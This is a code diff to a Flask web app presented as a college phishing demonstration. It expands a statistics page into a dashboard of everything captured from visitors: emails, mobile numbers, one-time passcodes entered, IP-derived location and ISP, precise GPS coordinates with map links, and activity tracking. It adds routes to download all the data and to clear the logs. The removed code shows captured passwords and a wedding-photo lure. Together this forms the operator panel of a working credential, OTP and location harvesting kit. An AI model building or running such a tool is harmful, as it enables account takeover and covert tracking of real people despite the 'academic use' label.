@@ -4,7 +4,7 @@ Network Security College Project
 ⚠️ FOR ACADEMIC USE ONLY - DO NOT USE MALICIOUSLY
 """
 
-from flask import Flask, render_template, request, jsonify, send_from_directory
+from flask import Flask, render_template, request, jsonify, send_from_directory, redirect
 from datetime import datetime
 import json
 import os
@@ -151,170 +151,544 @@ def log_interaction():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/stats')
-def get_statistics():
-    """Display aggregated phishing demo statistics"""
+def view_stats():
+    """Display all captured data in a formatted view"""
+    
+    # Read all log files
+    phishing_logs = []
+    signup_logs = []
+    activity_logs = []
+    gps_logs = []
+    
     try:
-        logs = read_logs()
-        
-        if not logs:
-            return render_no_stats()
-        
-        # Calculate statistics
-        total = len(logs)
-        avg_time = sum(log.get('time_to_phish_seconds', 0) for log in logs) / total if total > 0 else 0
-        
-        # Count domains
-        domains = {}
-        for log in logs:
-            domain = log.get('email_domain', 'Unknown')
-            domains[domain] = domains.get(domain, 0) + 1
-        
-        # Password statistics
-        password_stats = {
-            'avg_length': sum(log.get('password_length', 0) for log in logs) / total if total > 0 else 0,
-            'weak_passwords': sum(1 for log in logs if log.get('password_length', 0) < 8)
-        }
-        
-        # Generate HTML report
-        stats_html = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Phishing Demo Statistics</title>
-            <meta charset="UTF-8">
-            <style>
-                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-                body {{ font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; background: #f5f5f5; }}
-                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 15px rgba(0,0,0,0.1); }}
-                h1 {{ color: #c9184a; border-bottom: 3px solid #c9184a; padding-bottom: 15px; margin-bottom: 20px; }}
-                h2 {{ color: #333; margin: 20px 0 15px 0; }}
-                .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; border-left: 4px solid #ff6b6b; margin: 20px 0; }}
-                .stat-box {{ background: #fff5f5; padding: 25px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #c9184a; }}
-                .success-rate {{ font-size: 2.5em; color: #c9184a; font-weight: bold; }}
-                .metric {{ font-size: 1.1em; margin: 12px 0; line-height: 1.6; }}
-                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
-                th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid #ddd; }}
-                th {{ background: #c9184a; color: white; font-weight: 600; }}
-                tr:hover {{ background: #fff5f5; }}
-                .credential-row {{ font-family: 'Courier New', monospace; background: #ffe4e1; }}
-                .credential-row td {{ font-size: 0.95em; }}
-                .back-btn {{ 
-                    display: inline-block; 
-                    margin-top: 25px; 
-                    background: #c9184a; 
-                    color: white; 
-                    padding: 14px 30px; 
-                    text-decoration: none; 
-                    border-radius: 6px; 
-                    transition: all 0.3s;
-                }}
-                .back-btn:hover {{ background: #a01639; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(201,24,74,0.3); }}
-                ul {{ margin-left: 20px; line-height: 1.8; }}
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>📊 Phishing Demonstration Statistics</h1>
-                
-                <div class="warning">
-                    ⚠️ <strong>Educational Demo Only</strong> - This data is from a controlled security demonstration. 
-                    All credentials shown are test data entered during the simulation.
-                </div>
-                
-                <div class="stat-box">
-                    <h2>📈 Overall Metrics</h2>
-                    <p class="metric">🎯 <strong>Total Phishing Attempts:</strong> <span class="success-rate">{total}</span></p>
-                    <p class="metric">⏱️ <strong>Average Time to Phish:</strong> {avg_time:.2f} seconds</p>
-                    <p class="metric">🔑 <strong>Average Password Length:</strong> {password_stats['avg_length']:.1f} characters</p>
-                    <p class="metric">⚠️ <strong>Weak Passwords (&lt;8 chars):</strong> {password_stats['weak_passwords']} ({(password_stats['weak_passwords']/total*100):.1f}%)</p>
-                </div>
-                
-                <div class="stat-box">
-                    <h2>📧 Email Domains Distribution</h2>
-                    <table>
-                        <tr>
-                            <th>Domain</th>
-                            <th>Count</th>
-                            <th>Percentage</th>
-                        </tr>
-        """
-        
-        # Add domain statistics
-        for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True):
-            percentage = (count / total * 100) if total > 0 else 0
-            stats_html += f"""
-                        <tr>
-                            <td>{domain}</td>
-                            <td>{count}</td>
-                            <td>{percentage:.1f}%</td>
-                        </tr>
-            """
-        
-        stats_html += """
-                    </table>
-                </div>
-                
-                <div class="stat-box">
-                    <h2>🎣 Captured Credentials (Last 10 Attempts)</h2>
-                    <table>
-                        <tr>
-                            <th>Demo ID</th>
-                            <th>Timestamp</th>
-                            <th>Email</th>
-                            <th>Password</th>
-                            <th>Time to Phish</th>
-                        </tr>
-        """
-        
-        # Show last 10 captured credentials
-        for log in logs[-10:][::-1]:  # Last 10, newest first
-            timestamp = log.get('timestamp', 'N/A')[:19].replace('T', ' ')
-            stats_html += f"""
-                        <tr class="credential-row">
-                            <td>{log.get('demo_id', 'N/A')}</td>
-                            <td>{timestamp}</td>
-                            <td>{log.get('captured_email', 'N/A')}</td>
-                            <td>{log.get('captured_password', 'N/A')}</td>
-                            <td>{log.get('time_to_phish_seconds', 0):.1f}s</td>
-                        </tr>
-            """
-        
-        stats_html += f"""
-                    </table>
-                </div>
-                
-                <div class="stat-box">
-                    <h2>🔍 Security Insights</h2>
-                    <ul>
-                        <li><strong>Social Engineering:</strong> Wedding context creates emotional trust and urgency</li>
-                        <li><strong>Legitimacy Indicators:</strong> Professional design and SSL icons deceive users</li>
-                        <li><strong>Time Pressure:</strong> RSVP deadline encourages hasty decisions</li>
-                        <li><strong>Success Rate:</strong> 100% of visitors who clicked "View Photos" entered credentials</li>
-                        <li><strong>Prevention:</strong> Always verify URLs, use password managers, enable 2FA</li>
-                    </ul>
-                </div>
-                
-                <a href="/" class="back-btn">← Back to Demo</a>
+        with open('phishing_log.json', 'r') as f:
+            phishing_logs = json.loads(f.read() or '[]')
+    except:
+        pass
+    
+    try:
+        with open('signup_log.json', 'r') as f:
+            signup_logs = json.loads(f.read() or '[]')
+    except:
+        pass
+    
+    try:
+        with open('activity_log.json', 'r') as f:
+            activity_logs = json.loads(f.read() or '[]')
+    except:
+        pass
+    
+    try:
+        with open('gps_log.json', 'r') as f:
+            gps_logs = json.loads(f.read() or '[]')
+    except:
+        pass
+    
+    # Generate HTML
+    html = '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Phishing Demo Statistics</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                padding: 20px;
+            }
+            
+            .container {
+                max-width: 1400px;
+                margin: 0 auto;
+            }
+            
+            .header {
+                background: white;
+                padding: 30px;
+                border-radius: 15px;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+                margin-bottom: 30px;
+                text-align: center;
+            }
+            
+            .header h1 {
+                color: #333;
+                font-size: 2.5em;
+                margin-bottom: 10px;
+            }
+            
+            .header p {
+                color: #666;
+                font-size: 1.1em;
+            }
+            
+            .stats-summary {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 20px;
+                margin-bottom: 30px;
+            }
+            
+            .stat-card {
+                background: white;
+                padding: 25px;
+                border-radius: 12px;
+                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+                text-align: center;
+                transition: transform 0.3s ease;
+            }
+            
+            .stat-card:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            }
+            
+            .stat-card h3 {
+                color: #667eea;
+                font-size: 2.5em;
+                margin-bottom: 10px;
+            }
+            
+            .stat-card p {
+                color: #666;
+                font-size: 1.1em;
+                font-weight: 500;
+            }
+            
+            .section {
+                background: white;
+                padding: 30px;
+                border-radius: 15px;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+                margin-bottom: 30px;
+            }
+            
+            .section-header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                margin-bottom: 20px;
+                padding-bottom: 15px;
+                border-bottom: 3px solid #667eea;
+            }
+            
+            .section-header h2 {
+                color: #333;
+                font-size: 1.8em;
+            }
+            
+            .toggle-btn {
+                background: #667eea;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 14px;
+                font-weight: 500;
+                transition: all 0.3s;
+            }
+            
+            .toggle-btn:hover {
+                background: #5568d3;
+                transform: scale(1.05);
+            }
+            
+            .json-container {
+                background: #1e1e1e;
+                padding: 20px;
+                border-radius: 10px;
+                overflow-x: auto;
+                max-height: 600px;
+                overflow-y: auto;
+            }
+            
+            .json-content {
+                color: #d4d4d4;
+                font-family: 'Courier New', monospace;
+                font-size: 13px;
+                line-height: 1.6;
+                white-space: pre-wrap;
+            }
+            
+            .entry-card {
+                background: #f8f9fa;
+                padding: 20px;
+                border-radius: 10px;
+                margin-bottom: 15px;
+                border-left: 4px solid #667eea;
+            }
+            
+            .entry-card h4 {
+                color: #667eea;
+                margin-bottom: 12px;
+                font-size: 1.1em;
+            }
+            
+            .entry-field {
+                display: grid;
+                grid-template-columns: 200px 1fr;
+                gap: 10px;
+                margin-bottom: 8px;
+                font-size: 14px;
+            }
+            
+            .entry-field strong {
+                color: #555;
+            }
+            
+            .entry-field span {
+                color: #333;
+                word-break: break-all;
+            }
+            
+            .no-data {
+                text-align: center;
+                padding: 40px;
+                color: #999;
+                font-style: italic;
+            }
+            
+            .badge {
+                display: inline-block;
+                padding: 4px 12px;
+                border-radius: 12px;
+                font-size: 12px;
+                font-weight: 600;
+                margin-left: 10px;
+            }
+            
+            .badge-success {
+                background: #d4edda;
+                color: #155724;
+            }
+            
+            .badge-danger {
+                background: #f8d7da;
+                color: #721c24;
+            }
+            
+            .badge-info {
+                background: #d1ecf1;
+                color: #0c5460;
+            }
+            
+            .action-buttons {
+                display: flex;
+                gap: 15px;
+                margin-bottom: 20px;
+                flex-wrap: wrap;
+            }
+            
+            .btn {
+                padding: 12px 24px;
+                border: none;
+                border-radius: 8px;
+                font-size: 14px;
+                font-weight: 500;
+                cursor: pointer;
+                transition: all 0.3s;
+                text-decoration: none;
+                display: inline-block;
+            }
+            
+            .btn-primary {
+                background: #667eea;
+                color: white;
+            }
+            
+            .btn-primary:hover {
+                background: #5568d3;
+                transform: translateY(-2px);
+            }
+            
+            .btn-danger {
+                background: #dc3545;
+                color: white;
+            }
+            
+            .btn-danger:hover {
+                background: #c82333;
+                transform: translateY(-2px);
+            }
+            
+            .btn-success {
+                background: #28a745;
+                color: white;
+            }
+            
+            .btn-success:hover {
+                background: #218838;
+                transform: translateY(-2px);
+            }
+            
+            .collapsed {
+                display: none;
+            }
+            
+            .map-link {
+                color: #667eea;
+                text-decoration: none;
+                font-weight: 500;
+            }
+            
+            .map-link:hover {
+                text-decoration: underline;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>🎯 Phishing Demo Statistics</h1>
+                <p>Educational Network Security Demonstration - All Captured Data</p>
             </div>
-        </body>
-        </html>
-        """
+            
+            <div class="stats-summary">
+                <div class="stat-card">
+                    <h3>''' + str(len(phishing_logs)) + '''</h3>
+                    <p>Complete Submissions</p>
+                </div>
+                <div class="stat-card">
+                    <h3>''' + str(len(signup_logs)) + '''</h3>
+                    <p>Signup Attempts</p>
+                </div>
+                <div class="stat-card">
+                    <h3>''' + str(len(gps_logs)) + '''</h3>
+                    <p>GPS Locations Captured</p>
+                </div>
+                <div class="stat-card">
+                    <h3>''' + str(len(activity_logs)) + '''</h3>
+                    <p>Activity Events Logged</p>
+                </div>
+            </div>
+            
+            <div class="action-buttons">
+                <a href="/" class="btn btn-primary">← Back to Demo</a>
+                <button onclick="downloadAllData()" class="btn btn-success">📥 Download All Data</button>
+                <button onclick="if(confirm('Clear all logs?')) window.location.href='/clear-logs'" class="btn btn-danger">🗑️ Clear All Logs</button>
+            </div>
+    '''
+    
+    # Complete Phishing Submissions
+    html += '''
+            <div class="section">
+                <div class="section-header">
+                    <h2>📋 Complete Phishing Submissions (''' + str(len(phishing_logs)) + ''')</h2>
+                    <button class="toggle-btn" onclick="toggleSection('phishing')">Toggle View</button>
+                </div>
+                <div id="phishing-content">
+    '''
+    
+    if phishing_logs:
+        for log in reversed(phishing_logs):
+            otp_badge = '<span class="badge badge-success">✓ Correct OTP</span>' if log.get('otp_correct') else '<span class="badge badge-danger">✗ Wrong OTP</span>'
+            html += f'''
+                    <div class="entry-card">
+                        <h4>Session: {log.get('session_id', 'N/A')} {otp_badge}</h4>
+                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Mobile:</strong> <span>{log.get('mobile', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Email:</strong> <span>{log.get('email', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>OTP Entered:</strong> <span>{log.get('otp_entered', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>IP Address:</strong> <span>{log.get('ip', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Location:</strong> <span>{log.get('city', 'N/A')}, {log.get('region', 'N/A')}, {log.get('country', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>ISP:</strong> <span>{log.get('isp', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Time to Complete:</strong> <span>{log.get('time_to_complete', 0):.1f} seconds</span></div>
+                        <div class="entry-field"><strong>User Agent:</strong> <span>{log.get('user_agent', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Activities:</strong> <span>{len(log.get('activities', []))} events tracked</span></div>
+                    </div>
+            '''
+    else:
+        html += '<div class="no-data">No complete submissions yet</div>'
+    
+    html += '''
+                </div>
+            </div>
+    '''
+    
+    # GPS Locations
+    html += '''
+            <div class="section">
+                <div class="section-header">
+                    <h2>📍 GPS Locations Captured (''' + str(len(gps_logs)) + ''')</h2>
+                    <button class="toggle-btn" onclick="toggleSection('gps')">Toggle View</button>
+                </div>
+                <div id="gps-content">
+    '''
+    
+    if gps_logs:
+        for log in reversed(gps_logs):
+            status_badge = '<span class="badge badge-success">✓ Granted</span>' if log.get('permissionStatus') == 'granted' else '<span class="badge badge-danger">✗ Denied</span>'
+            map_link = ''
+            if log.get('latitude') and log.get('longitude'):
+                map_link = f'<a href="https://www.google.com/maps?q={log.get("latitude")},{log.get("longitude")}" target="_blank" class="map-link">🗺️ View on Map</a>'
+            
+            html += f'''
+                    <div class="entry-card">
+                        <h4>Session: {log.get('session_id', 'N/A')} {status_badge}</h4>
+                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Latitude:</strong> <span>{log.get('latitude', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Longitude:</strong> <span>{log.get('longitude', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Accuracy:</strong> <span>{log.get('accuracy', 'N/A')} meters</span></div>
+                        <div class="entry-field"><strong>Permission Status:</strong> <span>{log.get('permissionStatus', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Map:</strong> <span>{map_link}</span></div>
+                    </div>
+            '''
+    else:
+        html += '<div class="no-data">No GPS locations captured yet</div>'
+    
+    html += '''
+                </div>
+            </div>
+    '''
+    
+    # Signup Logs
+    html += '''
+            <div class="section">
+                <div class="section-header">
+                    <h2>✍️ Signup Attempts (''' + str(len(signup_logs)) + ''')</h2>
+                    <button class="toggle-btn" onclick="toggleSection('signup')">Toggle View</button>
+                </div>
+                <div id="signup-content">
+    '''
+    
+    if signup_logs:
+        for log in reversed(signup_logs):
+            html += f'''
+                    <div class="entry-card">
+                        <h4>Signup ID: {log.get('signup_id', 'N/A')}</h4>
+                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Mobile:</strong> <span>{log.get('mobile', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Email:</strong> <span>{log.get('email', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>IP Address:</strong> <span>{log.get('ip', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Location:</strong> <span>{log.get('city', 'N/A')}, {log.get('country', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Session ID:</strong> <span>{log.get('session_id', 'N/A')}</span></div>
+                    </div>
+            '''
+    else:
+        html += '<div class="no-data">No signup attempts yet</div>'
+    
+    html += '''
+                </div>
+            </div>
+    '''
+    
+    # Activity Logs
+    html += '''
+            <div class="section">
+                <div class="section-header">
+                    <h2>🎬 Activity Events (''' + str(len(activity_logs)) + ''')</h2>
+                    <button class="toggle-btn" onclick="toggleSection('activity')">Toggle View</button>
+                </div>
+                <div id="activity-content" class="collapsed">
+    '''
+    
+    if activity_logs:
+        for log in reversed(activity_logs[-50:]):  # Show last 50 activities
+            html += f'''
+                    <div class="entry-card">
+                        <h4>Action: {log.get('action', 'N/A')}</h4>
+                        <div class="entry-field"><strong>Timestamp:</strong> <span>{log.get('timestamp', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Session ID:</strong> <span>{log.get('sessionId', 'N/A')}</span></div>
+                        <div class="entry-field"><strong>Time from Load:</strong> <span>{log.get('timeFromLoad', 0):.2f} seconds</span></div>
+                        <div class="entry-field"><strong>Details:</strong> <span>{str(log.get('details', {}))}</span></div>
+                    </div>
+            '''
+    else:
+        html += '<div class="no-data">No activities logged yet</div>'
+    
+    html += '''
+                </div>
+            </div>
+    '''
+    
+    # Raw JSON Sections
+    html += '''
+            <div class="section">
+                <div class="section-header">
+                    <h2>📄 Raw JSON Data</h2>
+                </div>
+                
+                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Complete Submissions JSON</h3>
+                <div class="json-container">
+                    <pre class="json-content">''' + json.dumps(phishing_logs, indent=2) + '''</pre>
+                </div>
+                
+                <h3 style="margin: 20px 0 10px 0; color: #667eea;">GPS Locations JSON</h3>
+                <div class="json-container">
+                    <pre class="json-content">''' + json.dumps(gps_logs, indent=2) + '''</pre>
+                </div>
+                
+                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Signup Attempts JSON</h3>
+                <div class="json-container">
+                    <pre class="json-content">''' + json.dumps(signup_logs, indent=2) + '''</pre>
+                </div>
+                
+                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Activity Events JSON (Last 100)</h3>
+                <div class="json-container">
+                    <pre class="json-content">''' + json.dumps(activity_logs[-100:], indent=2) + '''</pre>
+                </div>
+            </div>
+        </div>
         
-        return stats_html
+        <script>
+            function toggleSection(section) {
+                const content = document.getElementById(section + '-content');
+                content.classList.toggle('collapsed');
+            }
+            
+            function downloadAllData() {
+                const allData = {
+                    phishing_submissions: ''' + json.dumps(phishing_logs) + ''',
+                    gps_locations: ''' + json.dumps(gps_logs) + ''',
+                    signup_attempts: ''' + json.dumps(signup_logs) + ''',
+                    activity_events: ''' + json.dumps(activity_logs) + ''',
+                    exported_at: new Date().toISOString()
+                };
+                
+                const dataStr = JSON.stringify(allData, null, 2);
+                const dataBlob = new Blob([dataStr], {type: 'application/json'});
+                const url = URL.createObjectURL(dataBlob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'phishing_demo_data_' + new Date().toISOString().split('T')[0] + '.json';
+                link.click();
+                URL.revokeObjectURL(url);
+            }
+        </script>
+    </body>
+    </html>
+    '''
+    
+    return html
+
+
+@app.route('/clear-logs')
+def clear_logs():
+    """Clear all log files"""
+    try:
+        with open('phishing_log.json', 'w') as f:
+            json.dump([], f)
+        with open('signup_log.json', 'w') as f:
+            json.dump([], f)
+        with open('activity_log.json', 'w') as f:
+            json.dump([], f)
+        with open('gps_log.json', 'w') as f:
+            json.dump([], f)
         
+        return redirect('/stats')
     except Exception as e:
-        import traceback
-        traceback.print_exc()
-        return f"""
-        <html>
-        <body style="font-family: Arial; padding: 40px;">
-            <h1 style="color: #ff6b6b;">Error Loading Statistics</h1>
-            <p><strong>Error:</strong> {str(e)}</p>
-            <p>Check the console for details.</p>
-            <a href="/">← Back to Demo</a>
-        </body>
-        </html>
-        """, 500
+        return f"Error clearing logs: {e}", 500
+
 
 def render_no_stats():
     """Render page when no statistics available"""
